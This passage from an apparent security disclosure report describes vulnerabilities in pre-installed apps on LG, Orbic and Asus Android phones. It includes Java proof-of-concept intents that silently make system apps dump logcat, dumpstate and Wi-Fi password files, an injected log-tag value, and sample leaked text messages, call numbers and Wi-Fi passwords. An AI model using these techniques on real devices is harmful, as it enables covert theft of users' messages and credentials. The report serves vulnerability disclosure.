path as there is no input filtering to prevent a directory traversal attack. If the attacking app just provides a 
file name without a path, the default path is /storage/emulated/0/gnsslog. Therefore, the attacking app 
can escape these directories and provide a path that will resolve to an already created file that is owned by 
the attacking app and resides in the attacking app’s private directory. Normally, the com.lge.gnsslogcat 
app will only write messages corresponding to three different log tags, but the attacking app can provide 
parameter input to the logcat command executed by the com.lge.gnsslogcat app so that all messages 
(i.e., any log tag with any log level) will be contained in the file. The com.lge.gnsslogcat app will check 
for an ArrayList object in the intent that corresponds to a key name of tags. This allows an app 
to specify additional log tags that will be used in the logcat command. The attacking app can provide 
specific log tags it is interested in, although a more convenient approach is just to obtain them all, as it may 
be difficult to know all the interesting log tags on the device ahead of time. When using logcat command, 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
the initiating process can specify specific log tags and the accompanying log level (and up) that should be 
included and silence everything else (effectively white-listing what should be included). 
The com.lge.gnsslogcat app when executing normally will execute the logcat command below. 
logcat -v threadtime -s GpsLocationProvider:V LocationManagerService:V GnssLogService:V 
Whenever there are strings in the ArrayList object corresponding to the a key name of tags 
passed in the intent, it will take each String and append a :V to the end of it and add it to the end of the 
command above. Therefore, the attacking app has some control over parameters to the command, although 
the attacking app cannot perform arbitrary command injection due to the way Java executes a single 
command using Runtime.exec(String) API call. The appending of :V to the a specific log tag just makes 
it so that any message with that log tag at the level of verbose or above will be included. The -s argument 
will silence all other log tags that are not explicitly included as arguments. To obtain all the log entries (all 
log tags at all levels), a String of *:V Hidden is provided to the ArrayList object corresponding 
to the a key name of tags in the intent. The *:V is a wildcard that matches any log tag at the lowest log 
level which will match the lowest level and all levels above (i.e., every possible log message). Since the 
com.lge.gnsslogcat.GnssLogCat class iterates over the Strings that were provided in the 
ArrayList object and appends a :V to the end, a space and arbitrary word (i.e., *:V Hidden) is 
provided in the input to keep the command valid. Therefore, the command that the GnssLogCat class 
executes will be the following. 
logcat -v threadtime -s GpsLocationProvider:V LocationManagerService:V GnssLogService:V *:V 
Hidden:V 
This command will execute and write all available log data to the file it was instructed to by the attacking 
app. The com.lge.gnsslogcat.GnssLogFileManager class will create the log file (if it does not exist) 
and write the file using a java.io.FileOutpstream wrapped in a java.io.OutputStreamWriter object. 
The path is controlled by the attacker and contained in the intent belonging to a key value of logfilename. 
The result is that the attacking app now has the com.lge.gnsslogcat app writing the system-wide logcat 
log to a file it owns in its private directory. 
5.2 Orbic Wonder – Logcat Logs 
The Orbic Wonder27 Android device provides a method to obtain the logcat logs via a pre-installed platform 
app with a package name of com.ckt.mmitest (versionCode=25, versionName=7.1.2) that will write 
the logcat logs to the SD card when a specific activity is started. Any app that requests the 
READ_EXTERNAL_STORAGE permission can read from the SD card and also the created logcat log file. 
Therefore, a local app on the device can quickly start a specific activity application component 
(com.ckt.mmitest.MmiMainActivity) in the app (com.ckt.mmitest) to have the logcat log get written 
to 
the 
SD 
card. 
After 
starting 
the 
app 
with 
a 
specific 
flag 
in 
the 
intent 
(FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS), the app can programmatically return to the home screen and 
the app (com.ckt.mmitest) will not be visible in the recent apps. Then the logcat log will be continually 
written and can be mined on the device for sensitive user data. Alternatively, the entire log file can be 
exfiltrated to a remote location for processing. An example file path that the logs get written to is 
27 http://www.orbic.us/phones/details/10 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
/sdcard/MmiTest/fd5d9b82_0202-221453.log. This file name may vary, but the directory will be the 
same. The source code below will initiate the writing of the logcat log file to external storage. The first 
intent will start the activity application component which initiates the writing of the logcat log to the SD 
card. This intent contains a flag that will hide it from the recent apps list. The thread then sleeps 0.7 seconds. 
Then it launches an intent to return to the home screen, so the app is no longer visible or accessible to the 
user via the recent apps list. This can be done in the background from a service application component. 
Intent i = new Intent(); 
i.setClassName("com.ckt.mmitest", "com.ckt.mmitest.MmiMainActivity"); 
i.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS); 
this.startActivity(i); 
try { 
    Thread.sleep(700); 
} catch (InterruptedException e) { 
    e.printStackTrace(); 
} 
Intent i2 = new Intent("android.intent.action.MAIN"); 
i2.addCategory(Intent.CATEGORY_HOME); 
startActivity(i2); 
The default messaging app, com.android.mms (versionCode=25, versionName=7.1.2), on the Orbic 
Wonder device writes call data and the body of sent and received text messages to the logcat log. This is an 
insecure practice since it is unnecessary to write this data to the logcat log on a production device due to 
the possibility of the logcat log being exposed. The system_server process writes the call data to the logcat 
log. Using the ability to obtain the logcat log above, this will enable an app on the device to obtain the body 
of the user’s sent and received text messages, as well as call data as they occur. Some concrete examples 
are provided below. 
Sent text messages (destination number and body of text message) 
02-02 21:51:22.654  6538  6719 D Mms-debug: sendMessage sendIntent: Intent { 
act=com.android.mms.transaction.MESSAGE_SENT dat=content://sms/1 
cmp=com.android.mms/.transaction.SmsReceiver (has extras) } 
02-02 21:51:22.657  6538  6719 D Mms-debug: 
sendMultipartTextMessage:mDest=5716667157|mServiceCenter=null|messages=I am sending a text 
message|mPriority=-1|isExpectMore=false|validityPeriod=-
1|threadId=1|uri=content://sms/1|msgs.count=1|token=-1|mSubId=1|mRequestDeliveryReport=false 
Received text messages (sending number and body of text message) 
02-02 21:53:32.149  6538  6538 D Mms-debug: mWorkingMessage send mDebugRecipients=(571) 666-
7157 
02-02 21:53:32.149  6538  6538 D Mms-debug: send origThreadId: 1 
02-02 21:53:32.149  6538  6538 D Mms-debug: mText=Receiving a text message 
Outgoing call 
02-02 21:54:40.663  1348  1348 I Telecom : Class:  processOutgoingCallIntent isCallPull = 
false: PCR.oR@AFA02-02 21:54:40.663  1348  1348 I Telecom : Class:  processOutgoingCallIntent 
handle = tel:(571)%20666-7157,scheme = tel, uriString = (571) 666-7157, isSkipSchemaParsing = 
false, isAddParticipant = false: PCR.oR@AFA 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
Incoming call 
02-02 21:58:00.351  1348  1348 D PhonecallDetector: onIncomingCallReceived() number: 
+15716667157 start at: Fri Feb 02 21:58:00 EST 2018 
02-02 21:54:41.569  1348  1348 D PhonecallDetector: onOutgoingCallStarted() number: 5716667157 
start at: Fri Feb 02 21:54:41 EST 2018 
02-02 21:54:54.844  1348  1348 D PhonecallDetector: onOutgoingCallEnded() number: 5716667157 
start at: Fri Feb 02 21:54:41 EST 2018 end at: Fri Feb 02 21:54:54 EST 2018 
5.3 Asus ZenFone 3 Max – Obtaining the Logcat Logs, WiFi Passwords and More 
The Asus ZenFone 3 Max Android device contains a pre-installed app with a package name of 
com.asus.loguploader (versionCode=1570000275, 
versionName=7.0.0.55_170515) with an 
exported interface that allows any app on the phone to obtain a dumpstate file (kernel log, logcat log, dump 
of system services, which includes text of active notifications), Wi-Fi Passwords, and other system data 
that 
gets 
written 
to 
external 
storage. 
The 
build 
fingerprint 
of 
the 
device 
is 
asus/US_Phone/ASUS_X008_1:7.0/NRD90M/US_Phone-14.14.1711.92-20171208:user/release-
keys. In addition, the phone numbers for outgoing and incoming telephone calls get written to the logcat 
log, as well as the telephone numbers for outgoing and incoming text messages. Therefore, having access 
to the logcat log (via the dumpstate file), allows one to also obtain some telephony meta-data. 
The 
com.asus.loguploader 
app 
has 
an 
exported 
component 
named 
com.asus.loguploader.LogUploaderService. This component can be accessed by an app on the device 
to generate the log files that get dumped to external storage. Once an app interacts with it using a specific 
intent, the device will vibrate once and create two notifications: one that says “Log generating… Please 
wait for a while” and another that says “Bug Reporter is running. Tap for more information or to stop the 
app.” The device will vibrate again when the generation of the log files has completed. These two 
notifications are temporary and will be removed in around one second since a second intent is sent. 
The com.asus.loguploader app cannot be disabled through the Settings app. The source code to write 
the log data to the SD card is provided below. The first intent is to start the log generation and the second 
intent is to quickly remove the notifications. If the second intent was not sent, the generation of log files 
would leave notifications in the status bar for the user to see. 
Intent i = new Intent("MANUAL_UPLOAD"); 
i.setClassName("com.asus.loguploader", "com.asus.loguploader.LogUploaderService"); 
startService(i); 
Intent i2 = new Intent("MOVELOG_COMPLETED"); 
i2.setClassName("com.asus.loguploader", "com.asus.loguploader.LogUploaderService"); 
startService(i2); 
The source code above will cause the com.asus.loguploader app to write log data to a base directory of 
/sdcard/ASUS/LogUploader. Each time this code is executed, it will overwrite the previous files. A listing 
of the files in the most relevant directory (i.e., /sdcard/ASUS/LogUploader/general/sdcard) is provided 
below. 
ASUS_X008_1:/sdcard/ASUS/LogUploader/general/sdcard $ ls -alh 
total 9.4M 
drwxrwx--x 5 root sdcard_rw 4.0K 2018-05-20 13:32 . 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
drwxrwx--x 3 root sdcard_rw 4.0K 2018-05-20 13:32 .. 
drwxrwx--x 2 root sdcard_rw 4.0K 2018-05-20 13:32 anr 
-rwxrwx--x 1 root sdcard_rw  817 2018-05-20 13:32 df.txt 
-rw-rw---- 1 root sdcard_rw 9.3M 2018-05-20 13:32 dumpstate.txt 
-rwxrwx--x 1 root sdcard_rw 1.2K 2018-05-20 13:32 ls_data_anr.txt 
-rwxrwx--x 1 root sdcard_rw  218 2018-05-20 13:32 ls_data_tombstones.txt 
-rwxrwx--x 1 root sdcard_rw  902 2018-05-20 13:32 ls_wifi_asus_log.txt 
drwxrwx--x 2 root sdcard_rw 4.0K 2018-05-20 13:32 mtklog 
-rwxrwx--x 1 root sdcard_rw  474 2018-05-20 13:32 p2p_supplicant.conf 
drwxrwx--x 2 root sdcard_rw 4.0K 2018-05-20 13:32 tombstones 
-rwxrwx--x 1 root sdcard_rw  791 2018-05-20 13:32 wpa_supplicant.conf 
The 
two 
most 
interesting 
files 
are 
dumpstate.txt 
and 
wpa_supplicant.conf. 
The 
wpa_supplicant.conf file is a copy of the /data/misc/wifi/wpa_supplicant.conf file. The 
wpa_supplicant.conf contains the SSID and password for each network that the device has saved. The 
contents of the wpa_supplicant.conf file are shown below. Some of the data below has been changed 
about the networks for privacy reasons. 
ASUS_X008_1:/sdcard/ASUS/LogUploader/general/sdcard $ cat wpa_supplicant.conf                 
ctrl_interface=/data/misc/wifi/sockets 
driver_param=use_p2p_group_interface=1 
update_config=1 
device_name=US_Phone 
manufacturer=asus 
model_name=ASUS_X008DC 
model_number=ASUS_X008DC 
serial_number=H4AXGY012345DMV 
device_type=10-0050F204-5 
os_version=01020300 
config_methods=physical_display virtual_push_button 
p2p_no_group_iface=1 
external_sim=1 
wowlan_triggers=disconnect 
network={ 
ssid="HOME-NET" 
bssid=cc:35:40:b8:7c:e2 
psk="5GgMK*-Aa828" 
key_mgmt=WPA-PSK 
disabled=1 
id_str="%7B%22creatorUid%22%3A%221000%22%2C%22configKey%22%3A%22%5C%22HOME-
NET%5C%22WPA_PSK%22%7D" 
} 
network={ 
ssid="Huba" 
bssid=ac:22:0b:df:15:d8 
psk="2Vk69c9a*ze2" 
key_mgmt=WPA-PSK 
disabled=1 
id_str="%7B%22creatorUid%22%3A%221000%22%2C%22configKey%22%3A%22%5C%Huba%5C%22W
PA_PSK%22%7D" 
} 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
The dumpstate.txt file is the result of running the dumpstate command28. This is essentially a dump 
containing the logcat log, kernel log, a dump of system services, and more. The generated dumpstate.txt 
file from the listing of files above is 9.3MB. Notably, the text of the active notifications is contained in the 
file. The active notifications from the dumpstate.txt file is provided in Appendix C. The logcat log is 
contained within the dumpstate.txt file. Telephony meta-data for text messages and phone calls appear 
in the logcat log. Below are some examples that we have identified, although there may be additional log 
messages that can appear. 
Placing a call (log message written by the system_server process whenever the user makes a call) 
05-22 12:44:02.283  1185  1185 D Telecom : CallIntentProcessor: 
processOutgoingCallIntent(): uriString = 7035551234: PCR.oR@AX0 
Receiving a call (log message written by the com.android.phone process whenever there in an incoming 
call) 
05-22 12:47:36.883  1823  1823 D TelecomFramework: TelephonyConnectionService: 
createConnection, callManagerAccount: PhoneAccountHandle{TelephonyConnectionService, 
8901260145725529100f, UserHandle{0}}, callId: TC@2, request: ConnectionRequest 
tel:17035551234 Bundle[mParcelledData.dataSize=584], isIncoming: true, isUnknown: 
false 
Sending a text message (log message written by the android.process.acore process whenever a text 
message is sent) 
05-22 13:05:30.713  9110  9121 V ContactsProvider: query: 
uri=content://com.android.contacts/data/phones  projection=[contact_id, _id]  
selection=[data1 IN (?)]  args=[7035551234]  order=[null] CPID=3064 User=0 
Receiving a text message 
Receiving a text message (log message written by the com.android.phone process whenever a text 
message is received) 
05-22 13:08:41.014  1823  3972 D Mms/Provider/MmsSms: query begin, uri = 
content://mms-sms/threadID?recipient=%2B17035551234, selection = null 
05-22 13:08:41.017  1823  3972 D Mms/Provider/MmsSms: getAddressIds: get exist id=5, 
refinedAddress=+17035551234, currentNumber=7035551234 
5.4 LG G6 & LG Q6 – Dumping the Logcat Logs and Kernel Logs to External Storage 
The com.lge.mlt app (versionCode=60000002, versionName=6.0.2) is present as a pre-installed app 
on two LG devices we examined, show below with the corresponding build fingerprints. 